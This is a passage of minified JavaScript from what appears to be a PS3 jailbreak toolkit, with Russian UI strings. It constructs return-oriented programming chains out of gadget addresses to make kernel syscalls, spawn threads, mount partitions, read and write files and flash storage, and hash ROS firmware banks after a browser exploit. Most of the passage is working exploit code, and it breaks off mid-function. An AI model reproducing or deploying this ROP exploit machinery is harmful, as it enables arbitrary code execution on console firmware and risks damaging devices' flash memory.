            helper.sp = new soundPlayer, helper.heap.free([a, i]), helper.sm.ready() ? toast("Инициализация Xploit завершена<br>Toolset готов", "success", 5) : toast("Инициализация Xploit завершена с ошибками<br>Проверьте логи", "warning", 8), $("#ps3details").html("<table class='sys-table'><thead></thead><tbody><tr class='sys-table'><td>Прошивка PS3:</td><td class='cell-spacer'> </td><td class='align-right'>" + r + "</td></tr><tr class='sys-table'><td>VSH режим:</td><td class='cell-spacer'> </td><td class='align-right'>" + helper.vmode + "</td></tr><tr class='sys-table'><td>Kernel режим:</td><td class='cell-spacer'> </td><td class='align-right'>" + helper.kmode + "</td></tr><tr class='sys-table'><td>Кастомные вызовы:</td><td class='cell-spacer'> </td><td class='align-right'>" + e + "</td></tr></tbody></table>"), s || o.removeClass("ui-state-disabled"), $("#tabs").tabs("enable"), $("#tabs").tabs("option", "disabled", [3]), setTimeout(function() {
                Logger.info("PS3 Firmware: " + r + " VSH mode: " + helper.vmode + " Kernel mode: " + helper.kmode)
            }, 200)
        } else updateErrorDetails("PS3 Firmware: " + r + " XPLOIT ERROR", "PS3 Firmware: " + r + " XPLOIT ERROR"), toast("Произошла ошибка в процессе эксплоитации", "error", 8);
    else updateErrorDetails("PS3 Firmware version: " + r + " mismatch", "PS3 Firmware version vs vsh.self version: mismatch detected"), Logger.warn("Если вы используете спуфер версии прошивки, вам следует отключить его (временно) перед использованием PS3 Toolset."), toast("Прошивка на этой консоли не поддерживается. Эта проблема может быть вызвана подменой версии прошивки.", "error", 8)
}

function dummy_frame(e) {
    return fill(16, helper.dbyte41) + hexdw2bin(helper.gadgets_box.ugadget15_addr) + fill(192, helper.dbyte41) + hexdw2bin(e)
}

function set_r30_r31(e, r) {
    return fill(16, helper.dbyte41) + hexdw2bin(helper.gadgets_box.ugadget5_addr) + fill(88, helper.dbyte41) + hexdw2bin(e) + hexdw2bin(r)
}

function set_r3to11(e, r, t, s, o, l, n, a, i, p, d) {
    return fill(16, helper.dbyte41) + hexdw2bin(helper.gadgets_box.ugadget4_addr) + fill(80, helper.dbyte41) + fill(12, helper.dbyte41) + hexw2bin(i) + hexw2bin(a) + hexw2bin(l) + hexw2bin(o) + hexw2bin(s) + hexw2bin(t) + hexw2bin(r) + hexw2bin(e) + fill(16, helper.dbyte41) + hexw2bin(n) + fill(32, helper.dbyte41) + hexdw2bin(p) + fill(8, helper.dbyte41) + hexdw2bin(d)
}

function move_r29_into_r3(e) {
    return fill(16, helper.dbyte41) + hexdw2bin(helper.gadgets_box.ugadget7_addr) + fill(112, helper.dbyte41) + hexdw2bin(e)
}

function move_r31_into_r3(e) {
    return fill(16, helper.dbyte41) + hexdw2bin(helper.gadgets_box.ugadget6_addr) + fill(96, helper.dbyte41) + hexdw2bin(e)
}

function move_r3_into_r4(e) {
    return fill(16, helper.dbyte41) + hexdw2bin(helper.gadgets_box.ugadget14_addr) + fill(128, helper.dbyte41) + hexdw2bin(e)
}

function move_r4_into_r3(e) {
    return fill(16, helper.dbyte41) + hexdw2bin(helper.gadgets_box.ugadget14_addr + 4) + fill(128, helper.dbyte41) + hexdw2bin(e)
}

function move_r6_into_r3(e, r, t, s, o) {
    return fill(16, helper.dbyte41) + hexdw2bin(helper.gadgets_box.ugadget18_addr) + fill(96, helper.dbyte41) + hexdw2bin(e) + hexdw2bin(r) + hexdw2bin(t) + hexdw2bin(s) + hexdw2bin(o)
}

function move_r7_into_r3(e) {
    return fill(16, helper.dbyte41) + hexdw2bin(helper.gadgets_box.ugadget24_addr) + fill(96, helper.dbyte41) + hexdw2bin(e)
}

function move_r10_into_r3(e, r) {
    return fill(16, helper.dbyte41) + hexdw2bin(helper.gadgets_box.ugadget21_addr) + fill(88, helper.dbyte41) + hexdw2bin(e) + hexdw2bin(r)
}

function set_r29_r31(e, r) {
    return fill(16, helper.dbyte41) + hexdw2bin(helper.gadgets_box.ugadget19_addr + 36) + fill(128, helper.dbyte41) + hexdw2bin(e) + fill(8, helper.dbyte41) + hexdw2bin(r)
}

function set_r9_r10_r11_words(e, r, t, s, o) {
    return set_r29_r31() + fill(16, helper.dbyte41) + hexdw2bin(helper.gadgets_box.ugadget19_addr) + fill(92, helper.dbyte41) + hexw2bin(e) + hexw2bin(t) + hexw2bin(r) + fill(24, helper.dbyte41) + hexdw2bin(s) + fill(8, helper.dbyte41) + hexdw2bin(o)
}

function move_r9_into_r3() {
    var e = helper.heap.store(helper.gadgets_box.ugadget25_addr.toString32() + helper.snull32);
    return helper.heap.queue(e), set_r29_r31() + fill(16, helper.dbyte41) + hexdw2bin(helper.gadgets_box.ugadget19_addr + 4) + fill(96, helper.dbyte41) + hexw2bin(e) + fill(28, helper.dbyte41) + hexdw2bin(null) + fill(8, helper.dbyte41) + hexdw2bin(null) + fill(16, helper.dbyte41) + hexdw2bin(helper.gadgets_box.ugadget17_addr) + fill(88, helper.dbyte41)
}

function move_r8_into_r3() {
    var e = helper.heap.store(helper.gadgets_box.ugadget22_addr.toString32() + helper.snull32);
    return helper.heap.queue(e), set_r9_r10_r11_words(0, 0, e) + fill(16, helper.dbyte41) + hexdw2bin(helper.gadgets_box.ugadget17_addr) + fill(88, helper.dbyte41)
}

function move_r5_into_r3() {
    var e = helper.heap.store(helper.gadgets_box.ugadget23_addr.toString32() + helper.snull32);
    return helper.heap.queue(e), set_r9_r10_r11_words(0, 0, e) + fill(16, helper.dbyte41) + hexdw2bin(helper.gadgets_box.ugadget17_addr) + fill(88, helper.dbyte41)
}

function store_r3_dword(e, r) {
    return set_r9_r10_r11_words(0, e, 0) + fill(16, helper.dbyte41) + hexdw2bin(helper.gadgets_box.ugadget20_addr) + fill(96, helper.dbyte41) + hexdw2bin(r)
}

function store_r4_dword(e, r) {
    return move_r4_into_r3() + store_r3_dword(e, r)
}

function store_r5_dword(e, r) {
    return move_r5_into_r3() + store_r3_dword(e, r)
}

function store_r6_dword(e, r) {
    return move_r6_into_r3() + store_r3_dword(e, r)
}

function store_r7_dword(e, r) {
    return move_r7_into_r3() + store_r3_dword(e, r)
}

function store_r8_dword(e, r) {
    return move_r8_into_r3() + store_r3_dword(e, r)
}

function store_r9_dword(e, r) {
    return move_r9_into_r3() + store_r3_dword(e, r)
}

function store_r10_dword(e, r) {
    return move_r10_into_r3() + store_r3_dword(e, r)
}

function restore_toc(e) {
    return fill(16, helper.dbyte41) + hexdw2bin(helper.gadgets_box.ugadget8_addr) + fill(16, 0) + hexdw2bin(e) + fill(64, helper.dbyte41)
}

function store_r3_word(e, r) {
    return fill(16, helper.dbyte41) + hexdw2bin(helper.gadgets_box.ugadget11_addr + 4) + fill(96, helper.dbyte41) + hexdw2bin(e) + fill(16, helper.dbyte41) + hexdw2bin(helper.gadgets_box.ugadget11_addr) + fill(96, helper.dbyte41) + hexdw2bin(r)
}

function syscall(e, r, t, s, o, l, n, a, i, p, d, h, c, _, f, u) {
    return set_r30_r31() + set_r3to11(0, 0, s, o, l, n, a, i, e) + set_r30_r31(r, t) + fill(16, helper.dbyte41) + hexdw2bin(helper.gadgets_box.ugadget16_addr) + fill(128, helper.dbyte41) + hexdw2bin(p) + hexdw2bin(d) + hexdw2bin(h) + hexdw2bin(c) + hexdw2bin(_) + hexdw2bin(f) + hexdw2bin(u)
}

function syscall32(e, r, t, s, o, l, n, a, i) {
    return set_r30_r31() + set_r3to11(r, t, s, o, l, n, a, i, e) + fill(16, helper.dbyte41) + hexdw2bin(helper.gadgets_box.ugadget9_addr) + fill(104, helper.dbyte41)
}

function call_subByOpd(e, r, t, s, o, l, n, a, i) {
    return set_r30_r31() + set_r3to11(r, t, s, o, l, n, a, i, e) + fill(16, helper.dbyte41) + hexdw2bin(helper.gadgets_box.ugadget17_addr) + fill(88, helper.dbyte41)
}

function call_sub(e, r, t, s, o, l, n, a, i, p) {
    r = helper.heap.store(e.toString32() + r.toString32());
    return helper.heap.queue(r), call_subByOpd(r, t, s, o, l, n, a, i, p)
}

function callsub(e, r, t, s, o, l, n, a, i, p, d, h, c, _) {
    return h < 96 && helper.error("callsub cannot use the gadget at 0x" + e.toString(16) + " because its frame size is < 0x" + 96..toString(16)), restore_toc(r) + set_r30_r31() + set_r3to11(t, s, o, l, n, a, i, p, d) + fill(16, helper.dbyte41) + hexdw2bin(e) + fill(16, helper.dbyte41) + hexdw2bin(helper.gadgets_box.fptoc_addr) + fill(h - 56, 0) + hexdw2bin(_)
}

function call(e, r, t, s, o, l, n, a, i) {
    return helper.rop.rrun(call_subByOpd(e, r, t, s, o, l, n, a, i))
}

function callf(e, r, t, s, o, l, n, a, i) {
    return call(helper.memory.upeek32(helper.gadgets_box.fpdbase + e), r, t, s, o, l, n, a, i)
}

function get_stat(e) {
    var r = helper.heap.store(128);
    return helper.heap.queue(r), 0 !== libc.stat(e, r) ? (console.log("stat failed: errno " + libc.Geterrno()), 0) : r
}

function fsitem_exists(e) {
    var r = helper.heap.store(e, !0),
        t = helper.heap.store(128),
        e = libc.stat(r, t);
    return helper.heap.free([r, t]), 0 === e
}

function fsitem_getsize(e) {
    var r = helper.heap.store(128),
        t = helper.heap.store(e, !0),
        s = helper.rop.rrun(syscall32(helper.sc_fs_stat, t, r)),
        e = 2147483648 <= (e = helper.memory.upeek32(r + helper.stat_size_offset)) ? 0 : e;
    return helper.heap.free([r, t]), 0 !== s ? (Logger.error("fsitem_getsize stat error: 0x" + s), -1) : e
}

function getSHA256hash(e, r) {
    var t = helper.heap.store(32),
        r = sdk.cellCryptoPuSha256Hash(t, e, r);
    console.log("getSHA256hash: " + r);
    r = helper.memory.upeeks(t, 32, !1);
    return helper.heap.free([t]), r.toUpperCase()
}

function getSHA1hash(e, r) {
    var t = helper.heap.store(20),
        r = (sdk.cellCryptoPuSha1Hash(t, e, r), helper.memory.upeeks(t, 20, !1));
    return helper.heap.free([t]), r
}

function makeDir(e) {
    var r = helper.heap.store(e, !0),
        r = libc.mkdir(r);
    return helper.heap.free([e]), r
}

function removeDir(e) {
    var r = helper.heap.store(e, !0),
        r = libc.rmdir(r);
    return helper.heap.free([e]), r
}

function deleteFile(e) {
    var r = helper.heap.store(e, !0),
        r = libc.unlink(r);
    return helper.heap.free([e]), r
}

function moveFile(e, r) {
    var t = copyFile(e, r);
    return 0 === t && (r = helper.heap.store(e, !0), t = libc.unlink(r), helper.heap.free([e])), t
}

function copyFile(o, l, e, n) {
    var a = new fileObject(o),
        i = new fileObject(l, helper.fs_flag_create_append_rw),
        p = -1,
        d = -1;

    function h() {
        p = a.close(), d = i.close(), 0 === p && 0 === d ? (Logger.info("copyFile: Files closed successfully"), 0) : 0 !== p ? Logger.error("copyFile: Closing Error 0x" + p.toString(16) + " on source file " + o) : Logger.error("copyFile: Closing Error 0x" + d.toString(16) + " on destination file " + l), e && n && $.Deferred().done(e).resolve(n)
    }

    function r() {
        n = toast("Copying file", "warning", 300);
        var e = helper.swf.getMaxAvailableBufferAllocSize();
        if (a.size > e) {
            for (var r = Math.floor(a.size / e), t = a.size - r * e, s = 0; s < r && 0 === (p = a.load(e)) && 0 === (d = i.save(a.buffer, e, helper.fs_flag_create_append_rw)); s++);
            0 === p && 0 === d && 0 === (p = a.load(t)) && (d = i.save(a.buffer, t, helper.fs_flag_create_append_rw))
        } else 0 === (p = a.load()) && (d = i.save(a.buffer, a.size));
        0 === p && 0 === d ? (Logger.info("copyFile: File Saved - Bytes written: 0x" + a.size.toString(16)), 0) : 0 !== p ? Logger.error("copyFile: Error 0x" + p.toString(16) + " loading file " + o) : Logger.error("copyFile: Error 0x" + d.toString(16) + " saving file " + l), h()
    }
    return 0 === a.size ? (Logger.error("copyFile: Source file not found " + o), -1) : (0 < i.size ? (Logger.warn("copyFile: Destination file already exists " + l), confirmDialog("If you continue, " + l + " will be overwritten", "Confirm", r, null, h, null)) : r(), 0)
}

function createFile(e) {
    var r = new fileObject(e),
        e = -1;
    return r.size < 0 && (0 === (e = r.open(helper.fs_flag_create)) || 0 < r.fd) && (e = r.close()), e
}

function prep_threading() {
    var e = helper.heap.store(helper.gadgets_box.ugadget12_addr.toString32() + helper.gadgets_box.fptoc_addr.toString32()),
        r = helper.heap.store(helper.gadgets_box.ugadget13_addr.toString32() + helper.gadgets_box.fptoc_addr.toString32()),
        t = helper.heap.store(r.toString32());
    return {
        opd1: e,
        opd2: r,
        opd3: t
    }
}

function createThread(e, r, t, s, o) {
    var l = helper.heap.store(helper.gadgets_box.ugadget12_addr.toString32() + helper.gadgets_box.fptoc_addr.toString32()),
        n = helper.heap.store(helper.gadgets_box.ugadget13_addr.toString32() + helper.gadgets_box.fptoc_addr.toString32()),
        a = helper.heap.store(n.toString32());
    helper.heap.queue([l, n, a]), e = (e = dummy_frame() + e + syscall32(helper.sys_ppu_thread_exit, 0)).slice(0, 80) + helper.gadgets_box.fptoc_addr.toString64() + e.slice(288, 616) + l.toString32() + e.slice(624);
    var i = helper.stack.store(e),
        n = e.length / 2,
        l = helper.heap.store((i + 128).toString32()),
        e = helper.heap.store(t, !0),
        t = helper.heap.store(8);
    helper.heap.queue([l, e, t]), helper.rop.run(syscall32(helper.sys_ppu_thread_create, t, a, l, 0, s, o, r, e));
    e = helper.memory.upeek32(t + 4);
    return helper.rop.run(syscall32(helper.sys_ppu_thread_start, e)), helper.heap.free([t]), threadObject(e, i, n)
}

function threadObject(e, r, t) {
    return {
        thread_id: e,
        stack_offset: r,
        stack_size: t
    }
}

function createThreadwithOPD(e, r, t, s, o, l) {
    var n = (e = (e = dummy_frame() + e + ringBuzzer(3) + syscall32(helper.sys_ppu_thread_exit, 0)).substr(0, 80) + helper.gadgets_box.fptoc_addr.toString64() + e.substr(288, 328) + l.opd1.toString32() + e.substr(624)).length / 2,
        a = (new Date, helper.stack.store(e)),
        i = helper.heap.store((a + 128).toString32()),
        e = helper.heap.store(t, !0),
        t = helper.heap.store(8);
    helper.rop.run(syscall32(helper.sys_ppu_thread_create, t, l.opd3, i, 0, s, o, r, e));
    r = helper.memory.upeek32(t + 4);
    return helper.rop.run(syscall32(helper.sys_ppu_thread_start, r)), helper.heap.free([t, e, i]), {
        thread_id: r,
        stack_offset: a,
        stack_size: n
    }
}

function vset_r30_r31(e, r) {
    return fill(16, helper.dbyte41) + vhexdw2bin(helper.vshgadgets_box.vgadget3_addr) + fill(88, helper.dbyte41) + vhexdw2bin(e) + vhexdw2bin(r)
}

function vset_r3to11(e, r, t, s, o, l, n, a, i, p, d, h) {
    return vset_r30_r31() + fill(16, helper.dbyte41) + vhexdw2bin(helper.vshgadgets_box.vgadget4_addr) + fill(80, helper.dbyte41) + fill(12, helper.dbyte41) + hexw2bin(i) + hexw2bin(a) + hexw2bin(l) + hexw2bin(o) + hexw2bin(s) + hexw2bin(t) + hexw2bin(r) + fill(4, helper.dbyte41) + hexw2bin(n) + fill(16, helper.dbyte41) + vhexdw2bin(p) + vhexdw2bin(d) + vhexdw2bin(e) + fill(16, helper.dbyte41) + vhexdw2bin(helper.vshgadgets_box.vgadget5_addr) + fill(96, helper.dbyte41) + vhexdw2bin(h)
}

function vcall_subByOpd(e, r, t, s, o, l, n, a, i) {
    return vset_r3to11(r, t, s, o, l, n, a, i, e) + fill(16, helper.dbyte41) + vhexdw2bin(helper.vshgadgets_box.vgadget8_addr) + fill(88, helper.dbyte41)
}

function vsyscall32(e, r, t, s, o, l, n, a, i) {
    return vset_r3to11(r, t, s, o, l, n, a, i, e) + fill(16, helper.dbyte41) + vhexdw2bin(helper.vshgadgets_box.vgadget7_addr) + fill(104, helper.dbyte41)
}

function vstore_r3_word(e, r) {
    return fill(16, helper.dbyte41) + vhexdw2bin(helper.vshgadgets_box.vgadget6_addr + 4) + fill(96, helper.dbyte41) + vhexdw2bin(e) + fill(16, helper.dbyte41) + vhexdw2bin(helper.vshgadgets_box.vgadget6_addr) + fill(96, helper.dbyte41) + vhexdw2bin(r)
}

function vringBuzzer(e) {
    var r = 4,
        t = 6;
    return 3 === e ? (r = 10, t = 438) : 10 === e && (r = 10, t = 4095), vsyscall32(helper.sc_sm_ring_buzzer, 4100, r, t)
}

function createExternalResourceThread(e, r, t, s, o, l) {
    helper.memory.upokes(l, (l - 20).toString64() + helper.vshgadgets_box.vgadget10_addr.toString32() + helper.vshgadgets_box.vtoc_addr.toString32() + (l + 8).toString32() + (l + 65536).toString32() + "0000000000000000" + t.toAscii8()), e = helper.vshgadgets_box.vgadget9_addr.toString32() + helper.vshgadgets_box.vtoc_addr.toString32() + fill(32, helper.dbyte41) + helper.vshgadgets_box.vtoc_addr.toString64() + fill(64, helper.dbyte41) + e + vsyscall32(helper.sys_ppu_thread_exit, 0), helper.memory.upokes(l + 65536, e), helper.rop.run(syscall32(helper.sys_ppu_thread_create, l + 24, l + 16, l, 0, s, o, r, l + 32));
    r = helper.memory.upeek32(l + 28);
    return helper.rop.run(syscall32(helper.sys_ppu_thread_start, r)), Logger.info("Started External Thread with ID: 0x" + r.toString(16)), {
        thread_id: r,
        stack_offset: l + 65536,
        stack_size: e.length / 2
    }
}

function startThread(e) {
    helper.rop.run(syscall32(helper.sys_ppu_thread_start, e))
}

function joinThread(e) {
    var r = helper.heap.store(8);
    helper.rop.run(syscall32(helper.sys_ppu_thread_join, e, r));
    e = helper.memory.upeek32(r + 4);
    return helper.heap.free([r]), e
}

function stopThread(e) {
    helper.rop.run(syscall32(helper.sys_ppu_thread_stop, e) + syscall32(helper.sys_ppu_thread_exit, 0))
}

function runNewThreadAndWait(e, r, t, s, o) {
    return 0 === joinThread(createThread(e, r, t, s, o)) ? 0 : 1
}

function sleep(e) {
    helper.rop.run(syscall32(helper.sys_timer_sleep, e))
}

function usleep(e) {
    helper.rop.run(syscall32(helper.sys_timer_usleep, e))
}

function ringBuzzer(e) {
    var r = 4,
        t = 6;
    return 3 === e ? (r = 10, t = 438) : 10 === e && (r = 10, t = 4095), syscall32(helper.sc_sm_ring_buzzer, 4100, r, t)
}

function mountPartition(e, r, t, s) {
    var o = helper.heap.store(e, !0),
        l = helper.heap.store(r, !0),
        e = helper.heap.store(t, !0),
        r = helper.heap.store();
    null == s && (s = 0);
    t = helper.rop.rrun(syscall32(helper.sc_fs_mount, o, l, e, 0, s, 0, !0 === t.startsWith("/dev_usb") ? r : 0));
    return helper.heap.free([o, l, e, r]), t
}

function getCurrentUserID() {
    var e = helper.heap.store(),
        r = helper.heap.store("/setting/user/lastLoginUserId".toAscii8()),
        t = helper.rop.rrun(call_sub(helper.vshgadgets_box.vgadget1_addr, helper.vshgadgets_box.vtoc_addr));
    helper.rop.run(call_sub(helper.vshgadgets_box.vgadget2_addr, helper.vshgadgets_box.vtoc_addr, t, r, e));
    t = helper.memory.upeek32(e);
    return helper.heap.free([e, r]), t
}

function getExdataPath() {
    return "/dev_hdd0/home/" + getCurrentUserID().toString32() + "/exdata/"
}

function getMinVer() {
    var e = helper.heap.store(40);
    helper.rop.run(syscall32(helper.sc_ss_update_manager, 24593, 1, e, 0, 0, 0, 0, 0));
    var r = helper.memory.upeek8(e + 1).toString(16) + "." + helper.memory.upeek8(e + 3).toString(16);
    return helper.heap.free([e]), r
}

function getMtldrVersion(e) {
    var r = helper.heap.store(512);
    if (0 !== e.read(1, 4, {
            offset: r,
            size: 512
        })) return "";
    e = helper.memory.upeeks(r + 32, 16, !0);
    return helper.heap.free([r]), e
}

function is_norflash() {
    var e = helper.heap.store(4);
    helper.rop.run(syscall32(helper.sc_ssgcf, e));
    var r = !(1 & helper.memory.upeek8(e)),
        t = r ? "NOR" : "NAND";
    return Logger.info("Обнаружен тип флэш-памяти: " + t), helper.heap.free([e]), r
}
var lwmutexObject = function(e) {
        var s = e,
            o = 0;
        this.create = function() {
            var e = helper.heap.store(s),
                r = helper.heap.store(4),
                t = sysprx.lwmutex_create(r, e);
            return o = 0 === t ? helper.memory.upeek32(r) : 0, helper.heap.free([r, e]), t
        }, this.id = function() {
            return o
        }, this.lock = function(e) {
            return 0 < o ? helper.rop.rrun(syscall32(helper.sys_lwmutex_lock, o, e || 0)) : -1
        }, this.trylock = function() {
            return 0 < o ? helper.rop.rrun(syscall32(helper.sys_lwmutex_trylock, o)) : -1
        }, this.unlock = function() {
            return 0 < o ? helper.rop.rrun(syscall32(helper.sys_lwmutex_unlock, o)) : -1
        }, this.close = function() {
            var e = 0 < o ? helper.rop.rrun(syscall32(helper.sys_lwmutex_destroy, o)) : -1;
            return o = 0 === e ? 0 : o, e
        }
    },
    mutexObject = function(e) {
        var s = e,
            o = 0;
        this.create = function() {
            var e = helper.heap.store(s),
                r = helper.heap.store(4),
                t = helper.rop.rrun(syscall32(helper.sys_mutex_create, r, e));
            return o = 0 === t ? helper.memory.upeek32(r) : 0, 0 === t ? Logger.info("Mutex created - handle: 0x" + o.toString(16)) : Logger.error("Mutex creation failed - error: 0x" + t.toString(16)), helper.heap.free([r, e]), t
        }, this.id = function() {
            return o
        }, this.lock = function(e) {
            return 0 < o ? helper.rop.rrun(syscall32(helper.sys_mutex_lock, o, e || 0)) : -1
        }, this.trylock = function() {
            return 0 < o ? helper.rop.rrun(syscall32(helper.sys_mutex_trylock, o)) : -1
        }, this.unlock = function() {
            return 0 < o ? helper.rop.rrun(syscall32(helper.sys_mutex_unlock, o)) : -1
        }, this.close = function() {
            var e = 0 < o ? helper.rop.rrun(syscall32(helper.sys_mutex_destroy, o)) : -1;
            return 0 === e ? Logger.info("Mutex closed - handle: 0x" + o.toString(16)) : Logger.error("Mutex closing failed - handle: 0x" + o.toString(16) + " error: 0x" + e.toString(16)), o = 0 === e ? 0 : o, e
        }
    },
    semaphoreObject = function(e) {
        var r = helper.heap.store(e),
            t = helper.heap.store(4),
            s = helper.heap.store(),
            o = helper.heap.store(52),
            l = 0,
            n = 0,
            a = "",
            i = "",
            p = "";
        this.create = function() {
            var e = helper.rop.rrun(syscall32(helper.sys_sem_create, t, r, 0, 1));
            return l = 0 === e ? helper.memory.upeek32(t) : 0, 0 === e ? Logger.info("Semaphore created - handle: 0x" + l.toString(16)) : Logger.error("Semaphore creation failed - error: 0x" + e.toString(16)), 0 < l && (i = syscall32(helper.sys_sem_post, l, 1), p = syscall32(helper.sys_sem_getvalue, l, s), 0 < (n = helper.rop.rrun(syscall32(helper.sys_process_getpid))) && (a = syscall32(helper.sys_dbg_get_seminfo, n, l, o))), e
        }, this.id = function() {
            return l
        }, this.getValue = function() {
            if (0 < l) {
                helper.memory.upoke32(ptr, 4294967295), helper.rop.run(p);
                var e = helper.memory.upeek32(ptr);
                return 4294967295 === e ? -1 : e
            }
            return -1
        }, this.trywait = function(e) {
            return 0 < l ? helper.rop.rrun(syscall32(helper.sys_sem_trywait, l)) : -1
        }, this.wait = function(e) {
            return 0 < l ? helper.rop.rrun(syscall32(helper.sys_sem_wait, l, e || 0)) : -1
        }, this.post = function(e) {
            return 0 < l ? helper.rop.rrun(syscall32(helper.sys_sem_post, l, e || 1)) : -1
        }, this.fast_post = function() {
            0 < l && helper.rop.run(i)
        }, this.numWaitThreads = function() {
            if (Logger.debug("numWaitThreads: Semaphore ID " + l.toString(16) + " Process ID " + n.toString(16) + " Info data at 0x" + o.toString(16)), l <= 0 || n <= 0 || a.length <= 0) return Logger.error("numWaitThreads: Not Ready"), -1;
            helper.memory.upoke32(o + 48, 4294967295);
            var e = helper.rop.rrun(a);
            if (0 < e) return Logger.error("numWaitThreads: error 0x" + e.toString(16)), -1;
            e = helper.memory.upeek32(o + 48);
            return Logger.debug("numWaitThreads: Waiting Threads count: " + e.toString(16)), 4294967295 === e ? -1 : e
        }, this.close = function() {
            var e = 0 < l ? helper.rop.rrun(syscall32(helper.sys_sem_close, l)) : -1;
            return 0 === e ? Logger.info("Semaphore closed - handle: 0x" + l.toString(16)) : Logger.error("Semaphore closing failed - handle: 0x" + l.toString(16) + " error: 0x" + e.toString(16)), 0 === (l = 0 === e ? 0 : l) && helper.heap.free([s]), e
        }
    },
    fileObject = function(n, e) {
        Logger.info("File Object Creation: " + n), this.path = helper.heap.store(n, !0), this.fd = -1, this.buffer = {
            offset: 0,
            size: 0
        }, this.mode = e || helper.fs_flag_readonly, this.getsize = function() {
            var e = helper.heap.store(128);
            lockMutexes();
            var r = helper.rop.rrun(syscall32(helper.sc_fs_stat, this.path, e));
            unlockMutexes();
            r = 0 === r ? helper.memory.upeek32(e + helper.stat_size_offset) : 0;
            return helper.heap.free([e]), r
        }, this.size = this.getsize(), this.chmod = function(e) {
            var r = 4294967295;
            return 273 <= e && e <= 1911 && (lockMutexes(), r = helper.rop.rrun(syscall32(helper.sc_fs_chmod, this.path, e)), lockMutexes()), 0 !== r && Logger.error("Файловый объект chmod: не удалось применить разрешения 0x" + e.toString(16)), r
        }, this.open = function(e) {
            var r, t, s = 0;
            return this.fd < 0 && (Logger.info("File Object open"), this.mode = e || this.mode, r = helper.heap.store("DEADBEEF"), t = helper.heap.store(), lockMutexes(), s = helper.rop.rrun(syscall32(helper.sc_fs_open, this.path, this.mode, r, helper.fs_mode, t)), unlockMutexes(), e = helper.memory.upeek32(r), this.fd = 3735928559 !== e ? e : -1, helper.heap.free([r, t]), (0 !== s || this.fd < 0) && Logger.error("File Object open: failed to open " + n)), s
        }, this.close = function(e) {
            var r = 0;
            return 0 <= this.fd && (lockMutexes(), r = helper.rop.rrun(syscall32(helper.sc_fs_close, this.fd)), unlockMutexes(), e && this.buffer && 0 < this.buffer.offset && helper.buffer.free([this.buffer.offset]), 0 !== r ? Logger.error("File Object close: failed to close " + n) : (this.fd = -1, Logger.info("File Object closed"))), r
        }, this.load = function(e, r, t, s) {
            var o = 2415919103;
            if (this.size <= 0) return Logger.info("File Object load: no data to load in " + n), o;
            if (0 !== (o = this.open(t)) || this.fd < 0) return o;
            e = e || this.size;
            r = r || null;
            if (r || (helper.buffer.free([this.buffer.offset]), this.buffer = helper.buffer.create(e), r = this.buffer), r.size < e && 0 < e) return o = 2332033023, Logger.error("File Object.load: Buffer size = 0x" + r.size.toString(16) + " bytes. Cannot buffer 0x" + e.toString(16) + " bytes of data at 0x" + r.offset.toString(16) + " - error: 0x" + o.toString32()), o;
            if (r.offset < 268435456) return o = 2348810239, Logger.error("File Object.load: Buffer size = 0x" + r.size.toString(16) + " bytes. Cannot buffer 0x" + e.toString(16) + " bytes of data at 0x" + r.offset.toString(16) + " - error: 0x" + o.toString32()), o;
            Logger.info("File Object load: Size 0x" + e.toString(16) + " Buffer offset 0x" + r.offset.toString32()), lockMutexes(), parseInt(s) === s && (l = helper.heap.store(), o = helper.rop.rrun(syscall32(helper.sc_fs_lseek, this.fd, s, 0, l)), Logger.info("File Object load: Seeking file position 0x" + s.toString(16)), 0 === o && s === helper.memory.upeek32(l) || Logger.error(0 < "File Object load error:" + o ? " 0x" + o.toString(16) : " seek operation failed"), helper.heap.free([l]));
            var l = helper.heap.store(8);
            o = helper.rop.rrun(syscall32(helper.sc_fs_read, this.fd, r.offset, e, l)), unlockMutexes();
            r = helper.memory.upeek32(l + 4);
            return helper.heap.free([l]), 0 !== o || r !== e ? Logger.error(0 < "File Object load error:" + o ? " 0x" + o.toString(16) : " Loaded 0x" + r.toString(16) + " bytes but expected size is 0x" + load_size.toString(16) + " bytes.<br>File loading error") : Logger.info("Загрузка файлового объекта: данные успешно загружены"), o
        }, this.save = function(e, r, t, s) {
            var o = 2415919103,
                l = e || this.buffer;
            if (536870912 < l.offset && l.size <= r && 0 < r) {
                e = helper.heap.store(8);
                if (0 !== (o = this.open(t || helper.fs_flag_create_rw)) || this.fd < 0) return o;
                lockMutexes(), parseInt(s) === s && (n = helper.heap.store(), o = helper.rop.rrun(syscall32(helper.sc_fs_lseek, this.fd, s, 0, n)), Logger.info("File Object save: Seeking file position 0x" + s.toString(16)), 0 === o && s === helper.memory.upeek32(n) || Logger.error(0 < "Ошибка сохранения файлового объекта:" + o ? " 0x" + o.toString(16) : " операция поиска не удалась"), helper.heap.free([n])), o = helper.rop.rrun(syscall32(helper.sc_fs_write, this.fd, l.offset, r, e)), unlockMutexes(), Logger.info("File Object save: Size 0x" + r.toString(16) + " Buffer offset 0x" + l.offset.toString32());
                var n = helper.memory.upeek32(e + 4);
                Logger.info("Сохранение файлового объекта: количество байтов записанных в файл 0x" + n.toString(16)), helper.heap.free([e]), n !== r ? (this.size += n, Logger.error("Ошибка сохранения файлового объекта: количество сохраненных байтов 0x" + n.toString(16) + " - Ожидаемое количество байтов для сохранения 0x" + r.toString(16))) : this.size += r
            } else l.offset <= 536870912 ? o = 2348810239 : l.size > r ? o = 2332033023 : r <= 0 && (o = 2365587455);
            return 0 !== o ? Logger.error("File Object save: error 0x" + o.toString(16)) : Logger.info("Сохранение файлового объекта: данные успешно сохранены"), o
        }
    },
    ROSHashObject = function(e, r) {
        if (this.error = {
                code: 0,
                msg: ""
            }, !e || !r) return this.error.code = 2415919098, void(this.error.msg = "ROSHashObject creation failure - bad arguments");
        if (this.error.code = e.open(), 0 === this.error.code) {
            var t = 28672 / helper.step_sector,
                s = 8 * t + 64 + 16,
                o = r.tls.offset;
            libc.memset(o, 255, s), this.ret = [], this.rlen = [], this.log = [], this.sfx = [];
            var l = r.dump_start,
                n = r.data_buffer.offset;
            this.log[0] = "Multithreaded ROS banks Hashing Operations:<br>Storage Object read - Number of Sectors: 0x" + 28672..toString(16);
            for (var a = "", i = 0; i < t; i++) this.ret[i] = o, this.rlen[i] = o + 4, o += 8, a += vsyscall32(helper.sc_ssr, e.device_handle, 0, l, helper.step_sector, n, this.rlen[i], 34, 0) + vstore_r3_word(this.ret[i]), this.log[0] += "<br>Storage Object read - Current Sector: 0x" + l.toString(16) + "<br>Storage Object read - Current Memory Buffer Offset: 0x" + n.toString(16), l += helper.step_sector, n += helper.step_sector * e.sector_size;
